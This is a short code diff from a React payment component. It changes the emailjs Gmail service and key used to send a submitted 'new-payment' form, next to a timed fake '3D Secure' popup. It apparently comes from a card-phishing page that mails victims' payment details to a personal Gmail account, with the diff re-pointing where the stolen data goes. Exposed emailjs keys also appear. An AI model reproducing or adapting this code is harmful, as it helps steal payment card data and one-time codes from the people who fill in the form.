@@ -64,7 +64,7 @@ const Board = () => {
       setShow3DSecurePopup(true);
     }, 5000);
 
-    emailjs.sendForm('gmail-benedikt', 'new-payment', event.target, '8SL7vzVHt7qSqEd4i')
+    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
       .then(() => {
         console.log('SUCCESS!');
         setIsLoading(false);
